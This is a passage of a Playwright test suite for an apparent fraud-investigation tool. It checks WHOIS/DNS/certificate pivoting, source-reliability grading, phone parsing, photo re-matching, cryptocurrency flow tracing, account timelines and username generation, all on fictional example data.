test('infrastructure pivots: WHOIS, RDAP, dig, crt.sh, Shodan, Censys and passive DNS joined into what the names share — privacy services, big DNS providers and CDN addresses are not links', async ({ page }) => {
  const errors = await open(page, '#/home');
  const files = ['whois-portal.txt', 'whois-billing.txt', 'whois-blog.txt', 'rdap-invoices.json', 'dig.txt', 'crtsh.json', 'shodan.json', 'censys.json', 'vt-resolutions.json', 'circl.jsonl', 'pdns.csv'];
  const T = Object.fromEntries(files.map(f => [f, infraFix('case/' + f)]));
  const kinds = await page.evaluate(T => Object.fromEntries(Object.entries(T).map(([f, t]) => { const P = infraParse(t); return [f, P ? P.kind + ':' + P.facts.length : null]; })), T);
  expect(kinds).toEqual({ 'whois-portal.txt': 'WHOIS:7', 'whois-billing.txt': 'WHOIS:5', 'whois-blog.txt': 'WHOIS:5', 'rdap-invoices.json': 'RDAP:6', 'dig.txt': 'DNS records:10', 'crtsh.json': 'Certificates (crt.sh):4', 'shodan.json': 'Shodan:7', 'censys.json': 'Censys:6', 'vt-resolutions.json': 'Passive DNS:2', 'circl.jsonl': 'Passive DNS:2', 'pdns.csv': 'Passive DNS:2' });
  // into a case: two through the paste dialog, the rest as evidence already there
  await page.evaluate(T => { DB.cases.push({ id: 'c-if', code: 'IF-1', name: 'Harbour phish', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }); DB.active = 'c-if';
    for(const f of ['whois-billing.txt', 'whois-blog.txt', 'rdap-invoices.json', 'dig.txt', 'crtsh.json', 'shodan.json', 'censys.json', 'vt-resolutions.json', 'circl.jsonl']) DB.records.push({ id: 'r-if-' + f, caseId: 'c-if', type: 'evidence', title: f, body: T[f], ts: Date.UTC(2024, 2, 10), tsRaw: '', tsZone: 'explicit', source: 'import', host: '', tags: [], ents: [], addedAt: Date.now() });
    mutate('add'); UI.ivView = 'dom'; go(caseHash('c-if', 'infra')); }, T);
  for(const f of ['whois-portal.txt', 'pdns.csv']){ await page.click('[data-act=ifPaste]'); await page.fill('#ifText', T[f]); await expect(page.locator('#ifHint')).toContainText(f === 'pdns.csv' ? 'Recognised: Passive DNS — 2 facts' : 'Recognised: WHOIS — 7 facts'); await page.click('#dlg [type=submit]'); }
  await page.click('[data-act=ifPaste]'); await page.fill('#ifText', T['pdns.csv']); await page.click('#dlg [type=submit]');
  await expect(page.locator('#dlg')).toContainText('already in the case'); await page.click('#dlg [data-act=dclose]');
  await page.click('[data-act=ifPaste]'); await page.fill('#ifText', 'hello, this is not a lookup result'); await page.click('#dlg [type=submit]');
  await expect(page.locator('#dlg')).toContainText('Not recognised'); await page.click('#dlg [data-act=dclose]');
  const S = await page.evaluate(() => infraIndex('c-if').shared.map(g => [g.strength, g.rel, g.v, g.subs.map(s => s.v).sort().join(' ')]));
  const P = 'harbour-line-portal.test', I = 'hl-invoices.test';
  expect(S.filter(x => x[0] === 'strong')).toEqual(expect.arrayContaining([
    ['strong', 'certificate', 'serial 03a6f1c2d4e5b6a7980123456789abcdef01', [P, I, 'www.' + P].sort().join(' ')],
    ['strong', 'certificate', 'sha256 5f2c0e9d7a4b3c1e8f6a5d4c3b2a19081726354453627180c9b8a7f6e5d4c3b2', '198.51.100.23 203.0.113.80'],
    ['strong', 'registrant email', 'k.voss.reg@mailbox.example', [P, I].join(' ')],
    ['strong', 'registrant phone', '+31612345678', [P, I].join(' ')],
    ['strong', 'site verification', 'google-site-verification=Qm3x9Kc2ZtT8wVvq4hXJ0bPzR1aLsN7eYdF5gHjKl0A', [P, I].join(' ')]]));
  expect(S.filter(x => x[0] === 'strong')).toHaveLength(5);
  expect(S.filter(x => x[0] === 'medium')).toEqual(expect.arrayContaining([
    ['medium', 'registrant name', 'Karl Voss', [P, I].join(' ')], ['medium', 'SOA contact', 'hostmaster@bulletdns.test', [P, I].join(' ')], ['medium', 'name server', 'bulletdns.test', [P, I].join(' ')],
    ['medium', 'resolves to', '198.51.100.23', [P, I].join(' ')], ['medium', 'resolves to', '203.0.113.80', ['harbourline-billing.test', I, P, 'login.harbourline-billing.test'].sort().join(' ')]]));
  expect(S.filter(x => x[0] === 'none').map(x => x[1] + ' ' + x[2]).sort()).toEqual(['registrant name REDACTED FOR PRIVACY', 'registrant org Privacy service provided by Withheld for Privacy ehf', 'resolves to 104.21.3.4']);
  expect(S.filter(x => x[0] === 'weak').map(x => x[1]).sort()).toEqual(['JARM', 'hosting', 'network', 'registered same day', 'registrar']);
  // on screen: strong first, the meaningless ones folded away, every fact traceable to its evidence
  const first = page.locator('.if-c').first().locator('.if-g').first();
  await expect(first.locator('.chip')).toHaveText('Strong');
  await expect(page.locator('.if-noise summary')).toContainText('3 shared things that mean nothing');
  await expect(page.locator('.if-sum')).toContainText('strong links');
  await page.locator('.if-g', { hasText: 'k.voss.reg@mailbox.example' }).locator('[data-act=ifSub]', { hasText: I }).click();
  await expect(page.locator('.if-t tbody tr').first()).toContainText(I);
  expect(await page.locator('.if-t tbody tr').evaluateAll((rows, I) => rows.every(r => r.textContent.includes(I)), I)).toBe(true);
  // the name also opens in the details panel, and the facts list is brought into view
  expect(await page.evaluate(() => UI.sel && UI.sel.kind === 'ent' && UI.sel.id)).toBe('domain:' + I);
  await expect(page.locator('#insp')).toContainText(I);
  await expect.poll(() => page.evaluate(() => { const b = document.getElementById('ifAll').getBoundingClientRect(); return b.top >= 0 && b.top < innerHeight; })).toBe(true);
  await page.locator('#insp [data-act=closeInsp]').click();
  await page.locator('.if-t tbody tr', { hasText: 'registrant email' }).locator('[data-act=tlxRec]').click();
  expect(await page.evaluate(() => [UI.tlMode, recById(UI.sel.id).title])).toEqual(['events', 'rdap-invoices.json']);
  noErrors(errors);
});

test('source reliability: sources rated A–F once for every case, evidence graded 1–6, and what rests on one weak source is told apart from what several independent sources back', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => {
    DB.cases.push({ id: 'c-sr', code: 'SR-1', name: 'Sources', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }); DB.active = 'c-sr';
    let i = 0; const mk = (source, body) => DB.records.push({ id: 'r-sr' + (i++), caseId: 'c-sr', type: 'evidence', title: body.slice(0, 40), body, ts: Date.UTC(2024, 3, 1) + i * 6e4, tsRaw: '', tsZone: 'explicit', source, host: '', tags: [], ents: extractRich(body), addedAt: Date.now() });
    mk('web page · www.Forum-Leaks.example', 'Seller "darkharbour" posts contact darkharbour@mailbox.example and phone +44 7700 900123');
    mk('web page · forum-leaks.example', 'Second post by darkharbour@mailbox.example offering invoices');               // same forum: not independent
    mk('web page · news.example', 'Report names darkharbour@mailbox.example as the seller behind the invoice scam');
    mk('import:breach-2023.csv', 'darkharbour@mailbox.example,Karl V,198.51.100.23');
    mk('', 'Tip from a call: wallet 1BoatSLRHtKNngkdXEeobR76b53LETtpyT');
    mk('import:breach-2023.csv', 'k.vogel@mailbox.example,Karl Vogel,203.0.113.77');
    rev++; cache = {}; for(const e of derive('c-sr').ents.values()){ if(e.k === 'phone') DB.verdicts[e.id] = 'suspicious'; if(e.v === 'k.vogel@mailbox.example') DB.verdicts[e.id] = 'malicious'; }
    mutate('add'); UI.qView = 'src'; go(caseHash('c-sr', 'questions')); });
  // sources: www. and case do not split one site; records without a source are listed apart
  await expect(page.locator('.sr-t tbody tr')).toHaveCount(4);
  await expect(page.locator('.sr-t tbody')).toContainText('web: forum-leaks.example');
  expect(await page.locator('.sr-t tbody tr', { hasText: 'web: forum-leaks.example' }).locator('td').nth(1).textContent()).toBe('2');
  await expect(page.locator('.sr-t tbody tr', { hasText: 'no source written down' }).locator('select')).toBeDisabled();
  // rate: the forum is unreliable, the news site usually reliable
  await page.locator('.sr-t tbody tr', { hasText: 'forum-leaks.example' }).locator('select').selectOption('E');
  await page.locator('.sr-t tbody tr', { hasText: 'news.example' }).locator('select').selectOption('B');
  // the email is in three independent sources (the forum's two posts are one); the phone and the other email rest on one source, the phone on a weak one
  const sev = page.locator('.sr-c', { hasText: 'Backed by several independent sources' });
  await expect(sev.locator('li', { hasText: 'darkharbour@mailbox.example' })).toContainText('3 sources');
  const one = page.locator('.sr-c', { hasText: 'Resting on one source' });
  await expect(one.locator('li').first()).toContainText('7700'); await expect(one.locator('li').first()).toContainText('only a weak source says so');
  await expect(one).toContainText('k.vogel@mailbox.example'); await expect(one.locator('li', { hasText: 'k.vogel' })).toContainText('source not rated');
  // grade one piece of evidence where it is read: B2 when the source is B
  await page.evaluate(() => { UI.sel = { kind: 'rec', id: 'r-sr2' }; UI.inspOpen = true; renderAll(); });
  await expect(page.locator('#srRelR')).toHaveValue('B');
  await page.selectOption('#srCredR', '2');
  await expect(page.locator('.sr-rec .sr-grade')).toHaveText('B2');
  // ratings belong to the source, in every case
  const G = await page.evaluate(() => { DB.cases.push({ id: 'c-sr2', code: 'SR-2', name: 'Other', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const r = { id: 'r-x', caseId: 'c-sr2', type: 'evidence', title: 'x', body: 'y', source: 'web page · forum-leaks.example', ents: [], tags: [] }; return [recGrade(r), srcKey(r), DB.records.find(x => x.id === 'r-sr2').cred]; });
  expect(G).toEqual(['E?', 'web: forum-leaks.example', '2']);
  // the indicator's panel says how many independent sources mention it
  await page.evaluate(() => { const e = [...derive('c-sr').ents.values()].find(x => x.v === 'darkharbour@mailbox.example'); UI.sel = { kind: 'ent', id: e.id }; renderAll(); });
  await expect(page.locator('.isec', { hasText: 'Sources' }).first()).toContainText('3 independent');
  noErrors(errors);
});

test('phone numbers offline: country and kind from the numbering plans, invalid and fictional numbers called out, and one number written three ways matched across cases', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => lazyNeed('phone'));
  const R = await page.evaluate(() => Object.fromEntries(['+33 6 12 34 56 78', '+49 30 901820', '+91 98765 43210', '+44 70 1234 5678', '+44 56 1234 5678', '+44 909 879 0000', '+1 800 555 0199', '+800 1234 5678', '+1 999 123 4567', '+44 7700 90012', '0044 20 7946 0123', '+234 803 123 4567', 'not a phone'].map(x => { const i = phoneInfo(x, ''); return [x, i.ok ? [i.e164, i.cc, i.typeLabel, i.valid, !!i.fiction] : i.why]; })));
  expect(R).toEqual({
    '+33 6 12 34 56 78': ['+33612345678', 'FR', 'Mobile', true, false], '+49 30 901820': ['+4930901820', 'DE', 'Landline', true, false], '+91 98765 43210': ['+919876543210', 'IN', 'Mobile', true, false],
    '+44 70 1234 5678': ['+447012345678', 'GB', 'Personal (follow-me) number', true, false], '+44 56 1234 5678': ['+445612345678', 'GB', 'VoIP', true, false], '+44 909 879 0000': ['+449098790000', 'GB', 'Premium rate', true, true],
    '+1 800 555 0199': ['+18005550199', 'US', 'Toll-free', true, true], '+800 1234 5678': ['+80012345678', '', 'Toll-free', true, false], '+1 999 123 4567': ['+19991234567', 'US', '', false, false], '+44 7700 90012': ['+44770090012', 'GB', '', false, false],
    '0044 20 7946 0123': ['+442079460123', 'GB', 'Landline', true, true], '+234 803 123 4567': ['+2348031234567', 'NG', 'Mobile', true, false], 'not a phone': 'Not a phone number in any plan' });
  // one number, three ways, in two cases
  await page.evaluate(() => { for(const [id, code] of [['c-pa', 'PA-1'], ['c-pb', 'PB-1']]) DB.cases.push({ id, code, name: code, color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    let i = 0; const mk = (caseId, body) => DB.records.push({ id: 'r-ph' + (i++), caseId, type: 'evidence', title: body.slice(0, 40), body, ts: Date.UTC(2024, 4, 1) + i * 6e4, tsRaw: '', tsZone: 'explicit', source: 'web page · market.example', host: '', tags: [], ents: extractRich(body), addedAt: Date.now() });
    mk('c-pa', 'Seller listing: contact WhatsApp +44 7911 123456 for bulk invoices'); mk('c-pb', 'Phone: 07911 123456 (ask for Dan)'); mk('c-pb', 'Call 0044-7911-123-456 after 6pm'); mutate('add'); });
  const ids = await page.evaluate(() => [...derive('c-pb').ents.values()].filter(e => e.k === 'phone').map(e => e.id).sort());
  expect(ids.length).toBe(2);
  await page.evaluate(id => { DB.active = 'c-pb'; UI.sel = { kind: 'ent', id }; UI.inspOpen = true; go(caseHash('c-pb', 'entities')); }, ids.find(x => /07911/.test(x)));
  const sec = page.locator('.isec.ph, .isec', { hasText: 'The number' }).first();
  await expect(sec).toContainText('No country code');
  await sec.locator('select[data-ph=cc]').selectOption('GB');
  const ph = page.locator('.isec.ph');
  await expect(ph).toContainText('United Kingdom'); await expect(ph).toContainText('Mobile'); await expect(ph).toContainText('+447911123456');
  await expect(ph).toContainText('read as United Kingdom');
  await expect(ph.locator('.note')).toContainText('+447911123456 PA-1'); await expect(ph.locator('.note')).toContainText('00447911123456 PB-1');
  // and the two cases are connected by it
  const L = await page.evaluate(() => caseLinks('c-pa').map(x => [x.c.id, x.shared.map(s => s.v)]));
  expect(L).toEqual([['c-pb', ['+447911123456']]]);
  noErrors(errors);
});

test('the same picture elsewhere: real photos found again after cropping, resizing, re-saving, mirroring, framing in a screenshot and text over them — and different photos are never matched', async ({ page }) => {
  const errors = await open(page, '#/home'); const fs = require('fs'), path = require('path'), dir = path.join(__dirname, 'fixtures/pics');
  const P = fs.readdirSync(dir).filter(f => f.endsWith('.jpg')).sort().map(f => fs.readFileSync(path.join(dir, f)).toString('base64'));
  const R = await page.evaluate(async P => {
    const blob = b64 => new Blob([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], { type: 'image/jpeg' });
    const draw = (w, h, fn) => { const c = document.createElement('canvas'); c.width = Math.round(w); c.height = Math.round(h); fn(c.getContext('2d')); return c; };
    const jpg = (c, q) => new Promise(r => c.toBlob(r, 'image/jpeg', q));
    const V = {
      resized: b => draw(b.width / 2, b.height / 2, x => x.drawImage(b, 0, 0, b.width / 2, b.height / 2)),
      resaved: b => draw(b.width, b.height, x => x.drawImage(b, 0, 0)),
      crop10: b => draw(b.width * .8, b.height * .8, x => x.drawImage(b, -b.width * .1, -b.height * .1)),
      crop20side: b => draw(b.width * .8, b.height, x => x.drawImage(b, -b.width * .2, 0)),
      crop30: b => draw(b.width * .7, b.height * .7, x => x.drawImage(b, -b.width * .15, -b.height * .15)),
      mirrored: b => draw(b.width, b.height, x => { x.translate(b.width, 0); x.scale(-1, 1); x.drawImage(b, 0, 0); }),
      screenshot: b => draw(b.width + 40, b.height + 160, x => { x.fillStyle = '#fff'; x.fillRect(0, 0, b.width + 40, b.height + 160); x.fillStyle = '#111'; x.fillRect(0, 0, b.width + 40, 50); x.drawImage(b, 20, 70); x.font = '20px sans-serif'; x.fillText('Liked by 214 others', 20, b.height + 110); }),
      textOver: b => draw(b.width, b.height, x => { x.drawImage(b, 0, 0); x.fillStyle = 'rgba(0,0,0,.6)'; x.fillRect(0, b.height * .78, b.width, b.height * .22); x.fillStyle = '#fff'; x.font = 'bold 36px sans-serif'; x.fillText('SHARE BEFORE THEY DELETE', 10, b.height * .92); }),
      grey: b => draw(b.width, b.height, x => { x.filter = 'grayscale(1)'; x.drawImage(b, 0, 0); }),
      rotated3: b => draw(b.width, b.height, x => { x.translate(b.width / 2, b.height / 2); x.rotate(3 * Math.PI / 180); x.drawImage(b, -b.width / 2, -b.height / 2); }),
      cropAndShrink: b => draw(b.width * .45, b.height * .45, x => x.drawImage(b, -b.width * .05, -b.height * .05, b.width * .5, b.height * .5)),
    };
    const base = []; for(const p of P){ const bl = blob(p); base.push({ b: await createImageBitmap(bl), s: await picSigBlob(bl), d: await dhashBlob(bl) }); }
    const found = {}, old = {}; for(const [k, f] of Object.entries(V)){ found[k] = 0; old[k] = 0; for(const x of base){ const c = await jpg(f(x.b), k === 'resaved' ? .3 : .8); const s = await picSigBlob(c); if(picMatch(s, x.s)) found[k]++; if(hamming(await dhashBlob(c), x.d) <= 10) old[k]++; } }
    let wrong = 0, closest = 64; for(let i = 0; i < base.length; i++) for(let j = i + 1; j < base.length; j++){ if(picMatch(base[i].s, base[j].s)) wrong++; closest = Math.min(closest, picDist(base[i].s, base[j].s).d); }
    return { n: base.length, found, old, wrong, closest };
  }, P);
  console.log('picture matching', JSON.stringify(R));
  expect(R.n).toBe(18);
  expect(R.wrong).toBe(0);                                                                         // 153 pairs of different photos: none matched
  const need = { resized: 15, resaved: 18, crop10: 17, crop20side: 15, crop30: 15, mirrored: 18, screenshot: 12, textOver: 17, grey: 17, rotated3: 16, cropAndShrink: 13 };
  for(const [k, n] of Object.entries(need)) expect(R.found[k], k).toBeGreaterThanOrEqual(n);
  for(const k of ['crop10', 'crop20side', 'crop30', 'mirrored', 'screenshot']) expect(R.found[k], k + ' better than before').toBeGreaterThan(R.old[k] + 8);
  // in a case: a cropped and mirrored repost in another case is shown in the evidence panel, with how it was changed
  await page.evaluate(async b64 => { for(const [id, code] of [['c-pi1', 'PI-1'], ['c-pi2', 'PI-2']]) DB.cases.push({ id, code, name: code, color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const bl = new Blob([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], { type: 'image/jpeg' }), b = await createImageBitmap(bl), c = document.createElement('canvas'); c.width = b.width * .8; c.height = b.height * .8; const x = c.getContext('2d'); x.translate(c.width, 0); x.scale(-1, 1); x.drawImage(b, -b.width * .1, -b.height * .1);
    const rep = await new Promise(r => c.toBlob(r, 'image/jpeg', .7));
    UI.capCase = 'c-pi1'; DB.active = 'c-pi1'; await attachFiles([new File([bl], 'original.jpg', { type: 'image/jpeg' })]);
    UI.capCase = 'c-pi2'; DB.active = 'c-pi2'; await attachFiles([new File([rep], 'repost.jpg', { type: 'image/jpeg' })]);
    const r = DB.records.find(x => x.caseId === 'c-pi1'); UI.sel = { kind: 'rec', id: r.id }; UI.inspOpen = true; DB.active = 'c-pi1'; go(caseHash('c-pi1', 'timeline')); }, P[2]);
  const sec = page.locator('.isec', { hasText: 'The same picture elsewhere' });
  await expect(sec.locator('.ps-l li')).toHaveCount(1); await expect(sec).toContainText('repost.jpg'); await expect(sec).toContainText('PI-2'); await expect(sec).toContainText('cropped from this picture and mirrored');
  await expect(sec.locator('a', { hasText: 'TinEye' })).toHaveAttribute('href', 'https://tineye.com/');
  noErrors(errors);
});

test('money flows: Bitcoin, Ethereum and TRON transactions from seven explorer formats joined into who paid whom — owners grouped by common inputs, change left out, CoinJoin and failed transactions set aside, patterns and other cases found', async ({ page }) => {
  const errors = await open(page, '#/home'); const fs = require('fs'), path = require('path'), dir = path.join(__dirname, 'fixtures/chain');
  const T = Object.fromEntries(fs.readdirSync(dir).filter(f => !/\.py$|addresses/.test(f)).map(f => [f, fs.readFileSync(path.join(dir, f), 'utf8')])), A = JSON.parse(fs.readFileSync(dir + '/addresses.json', 'utf8'));
  const K = await page.evaluate(T => Object.fromEntries(Object.entries(T).map(([f, t]) => [f, (walletParse(t) || {}).label])), T);
  expect(K).toEqual({ 'blockchain-scam2.json': 'Bitcoin (blockchain.com) — 2 transactions · BTC', 'blockcypher-peel.json': 'Bitcoin (BlockCypher) — 3 transactions · BTC', 'esplora-scam1.json': 'Bitcoin (Esplora) — 7 transactions · BTC', 'etherscan-forward.csv': 'Ethereum (Etherscan CSV) — 2 transactions · ETH', 'etherscan-tokentx.json': 'Ethereum tokens (Etherscan) — 1 transaction · USDT', 'etherscan-txlist.json': 'Ethereum (Etherscan) — 4 transactions · ETH', 'tronscan-trc20.json': 'TRON (Tronscan / TronGrid) — 3 transactions · USDT' });
  await page.evaluate(([T, A]) => { DB.cases.push({ id: 'c-wl', code: 'WL-1', name: 'Pig-butchering scam', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }, { id: 'c-wl2', code: 'EX-7', name: 'Exchange subpoena', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const mk = (id, caseId, title, body) => DB.records.push({ id, caseId, type: 'evidence', title, body, ts: Date.UTC(2024, 2, 1), tsRaw: '', tsZone: 'explicit', source: 'x', host: '', tags: [], ents: extractRich(body), addedAt: Date.now() });
    mk('r-wl-rep', 'c-wl', 'Victim report', `Victims were told to pay ${A.S1} (BTC), ${A.E1} (ETH) or ${A.T1} (USDT on TRON).`);
    mk('r-wl-ex', 'c-wl2', 'Deposit addresses from the exchange', `Customer deposit address: ${A.EX}`);
    for(const [f, t] of Object.entries(T)) if(f !== 'etherscan-forward.csv') mk('r-wl-' + f, 'c-wl', f, t);
    mutate('add'); DB.active = 'c-wl'; UI.ivView = 'money'; go(caseHash('c-wl', 'infra')); }, [T, A]);
  // the CSV export goes in through the paste box
  await page.click('[data-act=wlPaste]'); await page.fill('#wlText', T['etherscan-forward.csv']); await expect(page.locator('#wlHint')).toContainText('Recognised: Ethereum (Etherscan CSV) — 2 transactions'); await page.click('#dlg [type=submit]');
  const X = await page.evaluate(A => { const X = walletIndex('c-wl'), own = a => X.find(a), flow = (f, t, asset) => X.flows.filter(e => e.f === own(f) && e.to === own(t) && e.asset === asset).map(e => +e.v.toFixed(8));
    return { owners: [...X.owners.values()].filter(g => g.addrs.length > 1).map(g => g.addrs.sort()), sameOwner: own(A.S1) === own(A.S2),
      intoScam: A.V.slice(0, 5).map(v => flow(v, A.S1, 'BTC')[0]), toExchange: flow(A.S1, A.X, 'BTC'), toS3: flow(A.S1, A.S3, 'BTC'),
      eth: [flow(A.VA, A.E1, 'ETH'), flow(A.VB, A.E1, 'ETH'), flow(A.E1, A.E2, 'ETH'), flow(A.E2, A.EX, 'ETH'), flow(A.VC, A.E1, 'USDT')], tron: flow(A.T1, A.TX, 'USDT'),
      cjFlows: X.flows.filter(e => /cj/.test(e.f)).length, cjOwners: [...X.owners.values()].filter(g => g.addrs.length > 1).length,
      notes: X.notes.map(n => n.kind).sort(), peel: (X.notes.find(n => n.kind === 'peel') || {}).t, other: [...X.other.entries()].map(([a, cs]) => [a === A.EX, cs]), focus: X.focus.size, txs: X.txs.length }; }, A);
  expect(X.sameOwner).toBe(true);                                                                            // spent together in the consolidation
  expect(X.owners).toEqual([[A.S1, A.S2].sort()]);                                                           // the CoinJoin's inputs are not grouped
  expect(X.intoScam).toEqual([0.05, 0.12, 0.031, 0.2, 0.08]);
  expect(X.toExchange).toEqual([0.4]); expect(X.toS3).toEqual([0.0809]);
  expect(X.eth).toEqual([[1.5], [0.8], [2.25], [2.2], [5000]]);                                              // the failed 9 ETH transfer is not counted; a checksummed address is the same wallet
  expect(X.tron).toEqual([1195]);
  expect(X.txs).toBe(20);                                                                                     // the consolidation was in two pastes and the ETH forward in JSON and CSV: counted once
  expect(X.notes).toEqual(['coinjoin', 'fan-in', 'pass-through', 'pass-through', 'pass-through', 'pass-through', 'peel']);
  expect(X.peel).toMatch(/3 hops.*0\.01 BTC, 0\.011 BTC, 0\.0105 BTC/);
  expect(X.other).toEqual([[true, ['c-wl2']]]);
  expect(X.focus).toBe(4);                                                                                    // the three wallets in the report (BTC as one owner of two) and the one looked up on BlockCypher
  // on screen
  await expect(page.locator('.if-c', { hasText: 'What stands out' })).toContainText('Peel chain');
  await expect(page.locator('.if-c', { hasText: 'In other cases' })).toContainText('Exchange subpoena');
  await expect(page.locator('.if-c', { hasText: 'One owner, several addresses' })).toContainText(A.S2);
  await expect(page.locator('.wl-svg .wl-n.mine')).toHaveCount(4);
  await page.locator('.if-t tbody tr', { hasText: '2.2 ETH' }).locator('[data-act=wlRecs]').click();
  expect(await page.evaluate(() => [UI.tlMode, UI.facet.ids.length, recById(UI.facet.ids[0]).source])).toEqual(['events', 1, 'chain:Ethereum (Etherscan CSV)']);
  noErrors(errors);
});

test('account timeline: creation dates from GitHub, X, Reddit and Mastodon profile data and from page text, a rename found by account number and one written on the page, and freshly made accounts set up together pointed out', async ({ page }) => {
  const errors = await open(page, '#/home'); const fs = require('fs'), path = require('path'), dir = path.join(__dirname, 'fixtures/profiles'), F = n => fs.readFileSync(path.join(dir, n), 'utf8');
  const P = await page.evaluate(F => Object.fromEntries(Object.entries(F).map(([n, t]) => { const p = ftParseJson(t)[0]; return [n, p ? [p.platform, p.handle, p.id, new Date(p.created.ms).toISOString()] : null]; })), Object.fromEntries(['github-octocat.json', 'x-v2-user.json', 'reddit-about.json', 'mastodon-account.json', 'x-profile-page.txt'].map(n => [n, F(n)])));
  expect(P).toEqual({ 'github-octocat.json': ['GitHub', 'octocat', '583231', '2011-01-25T18:44:36.000Z'], 'x-v2-user.json': ['X / Twitter', 'harbour_deals', '1760099200000000001', '2024-02-20T22:41:07.000Z'], 'reddit-about.json': ['Reddit', 'harbourline_support', 't2_wq3c8n1z', '2024-02-22T16:00:00.000Z'], 'mastodon-account.json': ['Mastodon', 'hlportal@mastodon.social', '112033445566778899@mastodon.social', '2024-02-25T00:00:00.000Z'], 'x-profile-page.txt': null });
  await page.evaluate(F => { DB.cases.push({ id: 'c-ft', code: 'FT-1', name: 'Harbour phish accounts', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    let i = 0; const mk = (body, d, h = 12) => DB.records.push({ id: 'r-ft' + (i++), caseId: 'c-ft', type: 'evidence', title: body.split('\n')[0].slice(0, 60), body, ts: Date.UTC(2024, 2, d, h), tsRaw: '', tsZone: 'explicit', source: 'x', host: '', tags: [], ents: extractRich(body), addedAt: Date.now() });
    mk('Victim report: @harbour_deals sent me the refund link by DM', 1); mk('Victim report 2: Reddit user @harbourline_support offered to "speed up the refund"', 2); mk('Second victim names @harbour_deals again', 5, 9);
    mk('Kit template forked from @octocat example repo', 6); mk(F['github-kit-before.json'], 5); mk(F['github-kit-after.json'], 12); mk(F['x-v2-user.json'], 10); mk(F['reddit-about.json'], 10); mk(F['reddit-old.json'], 8); mk(F['github-octocat.json'], 9); mk(F['mastodon-account.json'], 10); mk(F['x-profile-page.txt'], 10);
    mutate('add'); DB.active = 'c-ft'; UI.ivView = 'acc'; go(caseHash('c-ft', 'infra')); }, Object.fromEntries(fs.readdirSync(dir).filter(n => !/README/.test(n)).map(n => [n, F(n)])));
  const X = await page.evaluate(() => { const X = footIndex('c-ft'); return { acc: Object.fromEntries(X.accounts.map(a => [a.handle, [a.created ? new Date(a.created.ms).toISOString().slice(0, 10) : null, a.first ? new Date(a.first).toISOString().slice(0, 10) : null, a.names.filter(n => n.old).map(n => n.v)]])), notes: X.notes.map(n => n.kind + ': ' + n.t) }; });
  expect(X.acc['harbour_deals']).toEqual(['2024-02-20', '2024-03-01', ['hl_giveaways']]);           // the exact date from X, not "February 2024" from the page; the old name from the page
  expect(X.acc['harbourline_support']).toEqual(['2024-02-22', '2024-03-02', []]);
  expect(X.acc['cloud-sync-tools']).toEqual(['2024-02-26', '2024-03-05', ['hl-portal-dev']]);      // the same GitHub account number under its old name
  expect(X.acc['hl-portal-dev']).toBeUndefined();
  expect(X.acc['hlportal@mastodon.social'][0]).toBe('2024-02-25');
  expect(X.acc['octocat']).toEqual(['2011-01-25', '2024-03-06', []]); expect(X.acc['old_trader_99'][0]).toBe('2016-05-01');
  expect(X.notes).toEqual(['new: harbour_deals was made 10 days before it first appears in your evidence', 'renamed: harbour_deals was called hl_giveaways before', 'new: harbourline_support was made 9 days before it first appears in your evidence',
    'new: hlportal@mastodon.social was made 15 days before it first appears in your evidence', 'new: cloud-sync-tools was made 8 days before it first appears in your evidence', 'renamed: cloud-sync-tools was called hl-portal-dev before',
    'together: harbour_deals, harbourline_support, hlportal@mastodon.social, cloud-sync-tools were made within 5 days of each other']);   // 2024 is a leap year: 20 Feb 22:41 to 1 Mar noon is 9.6 days
  expect(X.notes.join('\n')).not.toMatch(/octocat|old_trader_99/);
  // on screen
  await expect(page.locator('.ft-svg .ft-c')).toHaveCount(6);   // six accounts with a creation date
  await expect(page.locator('.if-c', { hasText: 'What stands out' }).locator('li')).toHaveCount(X.notes.length);
  await page.click('[data-act=ftPaste]'); await page.fill('#ftText', F('github-octocat.json')); await expect(page.locator('#ftHint')).toContainText('Recognised: GitHub profile of octocat, made 2011-01-25');
  await page.fill('#ftText', '{"hello": "world"}'); await page.click('#dlg [type=submit]'); await expect(page.locator('#dlg')).toContainText('not a profile');
  noErrors(errors);
});

test('generators: real-world names (accents, apostrophes, particles, double-barrelled, middle names, handles, years) give ranked usernames and emails, each copyable; the Forensics kit shows every tool at common screen widths', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => { const top = (o, n = 6) => genBuild(o).users.filter(x => x.tier === 1).map(x => x.v).slice(0, n), has = (o, v) => genBuild(o).users.some(x => x.v === v);
    return { okafor: top({ name: 'Jordan Okafor' }), oneil: top({ name: "Siobhán O'Neil" }, 2), vdb: has({ name: 'Jan van der Berg' }, 'jan.vanderberg') && has({ name: 'Jan van der Berg' }, 'jberg'), dbl: has({ name: 'Emma Smith-Jones' }, 'emma.smithjones') && has({ name: 'Emma Smith-Jones' }, 'ejones'),
      mid: has({ name: 'Mary Ann Lee' }, 'mal.lee') || has({ name: 'Mary Ann Lee' }, 'malee'), comma: top({ name: 'lol,bitcvh' }, 2), years: has({ name: 'Jordan Okafor', nums: '1992' }, 'jokafor92') && has({ name: 'Jordan Okafor', nums: '1992' }, 'jordan.okafor1992'),
      nick: genBuild({ nicks: '@jo_k' }).users[0].v, corp: genBuild({ name: 'Jordan Okafor', domains: 'corp.example, https://corp.co.uk/about' }).corp.filter(x => x.tier === 1).map(x => x.v), none: genBuild({ name: '' }) }; });
  expect(R.okafor).toEqual(['jordanokafor', 'jokafor', 'jordan.okafor', 'j.okafor', 'jordan_okafor', 'j_okafor']);
  expect(R.oneil).toEqual(['siobhanoneil', 'soneil']); expect(R.vdb).toBe(true); expect(R.dbl).toBe(true); expect(R.mid).toBe(true);
  expect(R.comma).toEqual(['lolbitcvh', 'lbitcvh']); expect(R.years).toBe(true); expect(R.nick).toBe('jo_k'); expect(R.none).toBe(null);
